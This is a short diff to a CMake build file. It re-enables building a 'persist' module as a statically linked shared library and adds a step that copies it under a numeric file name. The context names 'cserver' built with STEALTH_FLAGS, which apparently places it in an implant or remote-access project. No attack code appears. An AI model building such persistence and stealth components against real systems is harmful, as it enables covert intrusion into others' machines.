@@ -159,11 +159,14 @@ add_custom_command(TARGET manager POST_BUILD
 )
 
 # Build persist
-#file(GLOB persist_SRC "src/modules/persist/*.cpp")
-#add_library(persist SHARED ${persist_SRC} "charlie.pb.redacted.cc")
-#set_target_properties(persist PROPERTIES COMPILE_FLAGS "${MODULE_FLAGS}")
-#set_target_properties(persist PROPERTIES LINK_FLAGS     ${STATIC_LIBC_ARGS})
-#target_link_libraries(persist -Wl,-Bstatic  ${Boost_SYSTEM_LIBRARY} ${Boost_FILESYSTEM_LIBRARY} ${PROTOBUF_LITE_LIBRARIES})
+file(GLOB persist_SRC "src/modules/persist/*.cpp")
+add_library(persist SHARED ${persist_SRC} "charlie.pb.redacted.cc")
+set_target_properties(persist PROPERTIES COMPILE_FLAGS "${MODULE_FLAGS}")
+set_target_properties(persist PROPERTIES LINK_FLAGS     ${STATIC_LIBC_ARGS})
+target_link_libraries(persist -Wl,-Bstatic  ${Boost_SYSTEM_LIBRARY} ${Boost_FILESYSTEM_LIBRARY} ${PROTOBUF_LITE_LIBRARIES})
+add_custom_command(TARGET persist POST_BUILD
+  COMMAND ${CMAKE_COMMAND} -E copy $<TARGET_FILE:persist> ${CMAKE_SHARED_LIBRARY_PREFIX}2526948902${CMAKE_SHARED_LIBRARY_SUFFIX}
+)
 
 # Set the list of libraries to compile embed code
 set(embed_libraries manager)
@@ -260,5 +263,3 @@ if(NOT WINCC)
   set_target_properties(cserver PROPERTIES COMPILE_FLAGS "${STEALTH_FLAGS}")
   set_target_properties(cserver PROPERTIES LINK_FLAGS     ${STATIC_LIBC_ARGS})
  endif()
-
-
